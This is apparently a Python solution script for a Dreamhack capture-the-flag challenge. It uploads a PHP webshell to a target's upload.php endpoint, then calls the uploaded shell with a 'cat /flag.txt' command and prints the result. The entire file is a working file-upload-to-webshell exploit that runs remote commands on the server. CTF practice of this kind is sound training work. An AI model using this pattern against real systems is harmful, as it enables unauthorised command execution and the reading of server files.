from bs4 import BeautifulSoup
import requests

url = "http://host3.dreamhack.games:15694"
up_uri = "/upload.php"
payload = "/uploads/simple_php_webshell.php?cmd=cat+%2Fflag.txt"


upload = {'file': open('./simple_webshell.php', 'rb')}

resp = requests.post(url + up_uri, files=upload)

if resp.text.find('already exists.') > -1 or resp.text.find('Stored in:') > -1:
    resp = requests.get(url + payload)

    soup = BeautifulSoup(resp.content,"html.parser")
    pre = soup.find('pre')
    flag = pre.contents[0].replace('\n', '')
    print(flag)
else:
    print('Exploit failed...')